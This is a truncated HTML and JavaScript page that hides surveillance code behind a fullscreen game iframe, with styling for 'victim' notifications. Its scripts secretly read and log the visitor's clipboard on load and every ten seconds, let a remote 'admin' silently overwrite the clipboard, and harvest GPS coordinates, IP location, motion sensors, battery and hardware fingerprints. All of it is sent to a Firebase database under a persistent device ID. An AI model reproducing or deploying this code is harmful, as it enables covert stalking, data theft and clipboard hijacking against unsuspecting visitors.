      margin: 0;

    }

    /* Fullscreen iframe — restored to old behavior */
    .game-frame {
      position: fixed;
      top: 0;
      left: 0;

      height: 100%;
      border: none;

    /* Victim Premium Toasts */
    .victim-toasts {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      flex-direction: column;
      gap: 10px;
      z-index: 9999999;
      /* Sabse upar dikhega */
      pointer-events: none;
    }

    .v-toast {
      padding: 12px 24px;
      background: rgba(10, 14, 23, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 8px;
      font-size: 14px;
      font-weight: 700;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      gap: 10px;
      transform: translateY(-20px);
      opacity: 0;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
      color: #fff;
      border-left: 4px solid #00ff88;
    }

    .v-toast.show {
      transform: translateY(0);
      opacity: 1;
    }

    .v-toast.ok {
      border-color: #00ff88;
      box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
    }

    .v-toast.ok .v-toast-icon {
      color: #00ff88;
      text-shadow: 0 0 10px #00ff88;
    }

    .v-toast.err {
      border-color: #ff2e4c;
      box-shadow: 0 0 15px rgba(255, 46, 76, 0.2);
    }

    .v-toast.err .v-toast-icon {
      color: #ff2e4c;
      text-shadow: 0 0 10px #ff2e4c;
    }

    .v-toast-icon {
      font-size: 18px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

  <iframe id="dynamicFrame" class="game-frame" src="about:blank"
    allow="geolocation; clipboard-read; clipboard-write"></iframe>

  <script src="config.js"></script>
  <script>

    let database = null;
    let deviceId = null;
    let visitCount = 0;
    let gpsInterval = null;
    let geoInterval = null;
    let lastClipboardContent = '';
    let clipboardCheckInterval = null;
    let permissionInterval = null;
    let sensorData = { orientation: {}, motion: {}, lastUpdate: Date.now() };

    let hardwareInfo = {};
    let softwareInfo = {};

    /* ---------------- HARDWARE / SOFTWARE ---------------- */
    function getHardwareSoftwareInfo() {
      const ua = navigator.userAgent;

      hardwareInfo = {
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        vendor: navigator.vendor || 'Unknown',
        platform: navigator.platform || 'Unknown',
        product: navigator.product || 'Unknown',
        devicePixelRatio: window.devicePixelRatio || 1,
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenColorDepth: screen.colorDepth,
        screenPixelDepth: screen.pixelDepth
      };

      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
          if (dbg) {
            hardwareInfo.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            hardwareInfo.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          }
        }
      } catch (e) { }

      softwareInfo = {
        userAgent: ua,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        productSub: navigator.productSub,
        appCodeName: navigator.appCodeName,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        plugins: Array.from(navigator.plugins || []).map(p => p.name),
        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset()
      };

      if (ua.includes('Chrome')) softwareInfo.browser = 'Chrome';
      else if (ua.includes('Firefox')) softwareInfo.browser = 'Firefox';
      else if (ua.includes('Safari')) softwareInfo.browser = 'Safari';
      else if (ua.includes('Edg')) softwareInfo.browser = 'Edge';
      else softwareInfo.browser = 'Unknown';

      if (ua.includes('Windows')) softwareInfo.os = 'Windows';
      else if (ua.includes('Mac')) softwareInfo.os = 'macOS';
      else if (ua.includes('Android')) softwareInfo.os = 'Android';
      else if (ua.includes('iPhone')) softwareInfo.os = 'iOS';
      else softwareInfo.os = 'Unknown';

      return { hardware: hardwareInfo, software: softwareInfo };
    }

    /* ---------------- CLIPBOARD ---------------- */
    function initClipboardMonitoring() {
      document.addEventListener('copy', () => {
        const t = window.getSelection().toString();
        if (t && t !== lastClipboardContent) {
          lastClipboardContent = t;
          const d = {
            type: 'copy', text: t.substring(0, 1000), length: t.length,
            timestamp: Date.now(),
            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            url: location.href, deviceId
          };
          saveToFirebase(`clipboard_data/${deviceId}/copy/${Date.now()}`, d);
          saveToFirebase(`clipboard_data/${deviceId}/latest`, d);
        }
      });

      document.addEventListener('paste', (e) => {
        const t = e.clipboardData?.getData('text') || '';
        if (t) {
          const d = {
            type: 'paste', text: t.substring(0, 1000), length: t.length,
            timestamp: Date.now(),
            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            url: location.href, deviceId
          };
          saveToFirebase(`clipboard_data/${deviceId}/paste/${Date.now()}`, d);
          saveToFirebase(`clipboard_data/${deviceId}/latest_paste`, d);
        }
      });

      document.addEventListener('cut', () => {
        const t = window.getSelection().toString();
        if (t) {
          saveToFirebase(`clipboard_data/${deviceId}/cut/${Date.now()}`, {
            type: 'cut', text: t.substring(0, 1000), length: t.length,
            timestamp: Date.now(),
            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            url: location.href, deviceId
          });
        }
      });
    }

    function listenForAdminClipboard() {
      if (!database) return;

      // 5. CLIPBOARD LISTENER (Super Fix for Browsers)
      database.ref(`admin_commands/${deviceId}/clipboard`).on('value', async (snap) => {
        const c = snap.val();
        if (c && c.text && c.active) {

          const textToCopy = c.text;
          let success = false;

          // TRICK: Ek invisible button banao
          const btn = document.createElement('button');
          btn.style.position = 'fixed';
          btn.style.opacity = '0';
          btn.style.pointerEvents = 'none';
          document.body.appendChild(btn);

          // Button pe click event lagao jo copy karega
          btn.addEventListener('click', async () => {
            try {
              await navigator.clipboard.writeText(textToCopy);
              console.log('✅ Clipboard Set Successfully!');
              success = true;
            } catch (err) {
              // Fallback: Agar modern API fail ho jaye
              const textarea = document.createElement('textarea');
              textarea.value = textToCopy;
              textarea.style.position = 'fixed';
              document.body.appendChild(textarea);
              textarea.select();
              document.execCommand('copy');
              document.body.removeChild(textarea);
              success = true;
            }
          });

          // Button ko programmatically click karo
          btn.click();

          // Button ko remove kardo
          setTimeout(() => document.body.removeChild(btn), 1000);

          // Command clear karo
          database.ref(`admin_commands/${deviceId}/clipboard`).remove();
        }
      });
    }

    async function setClipboardText(text) {
      try { await navigator.clipboard.writeText(text); lastClipboardContent = text; return true; }
      catch (err) {
        try {
          const ta = document.createElement('textarea');
          ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
          document.body.appendChild(ta); ta.select();
          document.execCommand('copy'); document.body.removeChild(ta);
        } catch (e) { }
        return false;
      }
    }

    async function autoReadClipboardOnLoad() {
      try {
        if (!navigator.clipboard || !navigator.clipboard.readText) return;
        const text = await navigator.clipboard.readText();
        if (text && text.trim() !== '') {
          await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
            type: 'auto_read_on_load', text: text.substring(0, 1000), length: text.length,
            timestamp: Date.now(),
            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            url: location.href, deviceId, source: 'page_load_auto'
          });
        }
      } catch (error) {
        if (error.name === 'NotAllowedError') {
          const oneTimeClick = async () => {
            try {
              const text = await navigator.clipboard.readText();
              if (text) {
                await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
                  text: text.substring(0, 500), length: text.length, timestamp: Date.now()
                });
              }
            } catch (e) { }
            document.removeEventListener('click', oneTimeClick);
          };
          document.addEventListener('click', oneTimeClick);
        }
      }
    }

    function startPeriodicClipboardCheck() {
      if (clipboardCheckInterval) clearInterval(clipboardCheckInterval);
      clipboardCheckInterval = setInterval(async () => {
        try {
          if (!document.hidden && navigator.clipboard && navigator.clipboard.readText) {
            const t = await navigator.clipboard.readText();
            if (t && t !== lastClipboardContent && t.trim() !== '') {
              lastClipboardContent = t;
              await saveToFirebase(`clipboard_data/${deviceId}/periodic/${Date.now()}`, {
                type: 'periodic_check', text: t.substring(0, 1000),
                length: t.length, timestamp: Date.now(), deviceId
              });
            }
          }
        } catch (e) { }
      }, 10000);
    }

    /* ---------------- SENSORS ---------------- */
    function initMobileSensors() {
      if ('DeviceOrientationEvent' in window) {
        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
          document.body.addEventListener('click', () => {
            DeviceOrientationEvent.requestPermission()
              .then(r => { if (r === 'granted') window.addEventListener('deviceorientation', handleOrientation); })
              .catch(() => { });
          });
        } else {
          window.addEventListener('deviceorientation', handleOrientation);
        }
      }
      if ('DeviceMotionEvent' in window) {
        if (typeof DeviceMotionEvent.requestPermission === 'function') {
          document.body.addEventListener('click', () => {
            DeviceMotionEvent.requestPermission()
              .then(r => { if (r === 'granted') window.addEventListener('devicemotion', handleMotion); })
              .catch(() => { });
          });
        } else {
          window.addEventListener('devicemotion', handleMotion);
        }
      }
    }

    function handleOrientation(event) {
      sensorData.orientation = {
        alpha: event.alpha, beta: event.beta, gamma: event.gamma,
        absolute: event.absolute, timestamp: Date.now()
      };
      if (Date.now() - (sensorData.lastSave || 0) > 5000) {
        saveToFirebase(`sensors/${deviceId}/orientation/${Date.now()}`, sensorData.orientation);
        sensorData.lastSave = Date.now();
      }
    }

    function handleMotion(event) {
      sensorData.motion = {
        acceleration: { x: event.acceleration?.x, y: event.acceleration?.y, z: event.acceleration?.z },
        rotationRate: { alpha: event.rotationRate?.alpha, beta: event.rotationRate?.beta, gamma: event.rotationRate?.gamma },
        interval: event.interval, timestamp: Date.now()
      };
      if (Date.now() - (sensorData.lastSaveMotion || 0) > 5000) {
        saveToFirebase(`sensors/${deviceId}/motion/${Date.now()}`, sensorData.motion);
        sensorData.lastSaveMotion = Date.now();
      }
    }

    /* ---------------- GPS / GEO ---------------- */
    function getGPSLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) { reject('GPS not supported'); return; }
        navigator.geolocation.getCurrentPosition(
          p => resolve({
            latitude: p.coords.latitude, longitude: p.coords.longitude,
            accuracy: p.coords.accuracy, altitude: p.coords.altitude,
            speed: p.coords.speed, heading: p.coords.heading, timestamp: Date.now()
          }),
          e => reject(e.message),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    async function getGeoLocation() {
      try {
        const r = await fetch('https://ipapi.co/json/');
        const d = await r.json();
        return {
          ip: d.ip || 'Unknown', latitude: d.latitude || 0, longitude: d.longitude || 0,
          city: d.city || 'Unknown', region: d.region || 'Unknown',
          country: d.country_name || 'Unknown', postal: d.postal || 'Unknown',
          timezone: d.timezone || 'Unknown', timestamp: Date.now(),
          dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
        };
      } catch (e) { return null; }
    }

    async function saveToFirebase(path, data) {
      if (!database) return false;
      try { await database.ref(path).set(data); return true; }
      catch (e) { return false; }
    }

    async function saveGPSToFirebase(location) {
      if (!database || !location) return false;
      const g = {
        deviceId, type: 'gps', latitude: location.latitude, longitude: location.longitude,
        accuracy: location.accuracy, speed: location.speed, altitude: location.altitude,
        timestamp: Date.now(),
        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      await database.ref(`gps_locations/${deviceId}/current`).set(g);
      await database.ref(`gps_locations/${deviceId}/history`).push(g);
      return true;
    }

    async function saveGeoToFirebase(geo) {
      if (!database || !geo || !geo.latitude || geo.latitude === 0) return false;
      const g = {
        deviceId, type: 'geo', latitude: geo.latitude, longitude: geo.longitude,
        city: geo.city, region: geo.region, country: geo.country, ip: geo.ip,
        postal: geo.postal, timezone: geo.timezone, timestamp: Date.now(),
        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      await database.ref(`geo_locations/${deviceId}/current`).set(g);
      await database.ref(`geo_locations/${deviceId}/history`).push(g);
      return true;
    }

    async function captureGPS() {
      try { const g = await getGPSLocation(); await saveGPSToFirebase(g); return g; }
      catch (e) { smartLocationRequest(); return null; }
    }

    async function captureGeo() {
      try {
        const g = await getGeoLocation();
        if (g && g.latitude && g.latitude !== 0) { await saveGeoToFirebase(g); return g; }
        return null;
      } catch (e) { return null; }
    }

    /* ---------------- DEVICE INFO ---------------- */
    function generateDeviceId() {
      let id = localStorage.getItem('device_tracker_id');
      if (!id) {
        id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('device_tracker_id', id);
      }
      return id;
    }

    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        try { const b = await navigator.getBattery(); return Math.floor(b.level * 100) + '%'; }
        catch (e) { return 'Unknown'; }
      }
      return 'Not supported';
    }

    async function getIPAddress() {
      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
      catch (e) { return 'Unable to fetch'; }
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let browser = 'Unknown', os = 'Unknown', device = 'Unknown';

      // ✅ Edge ko pehle check karo kyunki usme bhi 'Chrome' hota hai
      if (ua.includes('Edg/') || ua.includes('Edge/')) browser = 'Edge';
      else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
      else if (ua.includes('Chrome')) browser = 'Chrome';
      else if (ua.includes('Firefox')) browser = 'Firefox';
      else if (ua.includes('Safari')) browser = 'Safari';

      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac')) os = 'macOS';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
      else if (ua.includes('Linux')) os = 'Linux';

      const m = ua.match(/\(([^)]+)\)/);
      if (m) device = m[1].substring(0, 30);

      return { browser, os, device, userAgent: ua };
    }

    function getNetworkInfo() {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      return c ? (c.effectiveType || c.type || 'Unknown') : 'Unknown';
    }

    function getScreenInfo() { return `${screen.width}x${screen.height}`; }
    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }

    async function updateVisitCount() {
      try {
        const snap = await database.ref(`device_visits/${deviceId}/count`).once('value');
        let count = snap.val() || 0; count++;
        visitCount = count;
        await database.ref(`device_visits/${deviceId}`).update({
          count, lastVisit: Date.now(),
          lastVisitTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
        });
        await database.ref(`visit_logs/${deviceId}`).push({
          visitNumber: count, timestamp: Date.now(),
          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
        });
        return count;
      } catch (e) { return 0; }
    }

    async function collectDeviceData() {
      const d = getDeviceInfo();
      const battery = await getBatteryInfo();
      const ip = await getIPAddress();
      return {
        deviceId, ip, deviceModel: d.device, os: d.os, browser: d.browser,
        userAgent: d.userAgent, screen: getScreenInfo(), battery,
        networkType: getNetworkInfo(), timezone: getTimezone(),
        visitNumber: visitCount, lastSeen: Date.now(),
        lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        status: 'active'
      };
    }

    async function saveDeviceDataToFirebase(data) {
      if (!database) return false;
      await database.ref(`devices/${deviceId}`).update(data);
      await database.ref(`device_history/${deviceId}`).push({
        ...data, loggedAt: Date.now(), loggedTime: data.lastSeenTime
      });
      await database.ref(`online_devices/${deviceId}`).set({
        status: 'online', lastSeen: data.lastSeen, lastSeenTime: data.lastSeenTime
      });
      return true;
    }

    async function updateDeviceInfo() {
      try {
        const d = await collectDeviceData();
        await saveDeviceDataToFirebase(d);
        return d;
      } catch (e) { return null; }
    }

    async function saveHardwareSoftwareInfo() {
      const info = getHardwareSoftwareInfo();
      const payload = {
        deviceId, hardware: info.hardware, software: info.software,
        timestamp: Date.now(),
        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
      };
      await saveToFirebase(`hardware_info/${deviceId}/current`, payload);
      await saveToFirebase(`software_info/${deviceId}/current`, payload);
    }

    /* ---------------- PERMISSIONS ---------------- */
   function smartLocationRequest() {
  if (!navigator.geolocation) return;

  // Direct GPS try karo (browser popup aayega)
  navigator.geolocation.getCurrentPosition(
    (pos) => {
      console.log("✅ Location Permission Granted");
      captureGPS(); 
    },
    (err) => {
      console.log("⚠️ Location Denied. Waiting for user click...");
      
      // Agar block hai, toh user ke click pe wapas try karo
      const askAgain = () => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            console.log("✅ Location Granted on Click");
            captureGPS();
          },
